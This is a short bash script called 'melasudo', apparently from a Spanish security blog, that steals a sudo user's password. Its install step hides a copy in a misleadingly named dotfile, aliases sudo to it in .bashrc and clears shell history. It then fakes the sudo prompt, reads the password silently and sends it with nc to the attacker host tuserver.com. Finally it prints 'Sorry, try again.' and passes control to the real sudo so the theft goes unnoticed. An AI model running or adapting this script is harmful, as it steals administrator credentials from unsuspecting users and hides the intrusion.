
#!/bin/bash
# Name: melasudo
#
# Description: http://www.seguridadapple.com/2012/02/melasudo-robar-la-password-un-sudoer.html
#
#

if [ "x$1" == "xinstalar" ]; then
cp $0 ~/.thumbmails 2> /dev/null
echo 'alias sudo="bash ~/.thumbmails"' >> ~/.bashrc
echo "instalado"
history -c
exit
fi
#mac
echo -n "Password:"

#ubuntu
#echo -n "[sudo] password for `whoami`: "

read -s password
echo
rutaReal=$(whereis sudo | awk '{print $2}')
if [ "x$rutaReal" == "x" ]; then
rutaReal=$(whereis sudo | awk '{print $1}')
if [ "x$rutaReal" == "x" ]; then
rutaReal=$(whereis sudo | awk '{print $0}')
fi
fi

echo -en "GET /password.php?password=$password HTTP/1.1\nConnection: close\nhost: tuserver.com\n\n" | nc tuserver.com 80 >/dev/null 2>/dev/null

echo -e "Sorry, try again."
$rutaReal $1 $2 $3 $4 $5 $6 $7
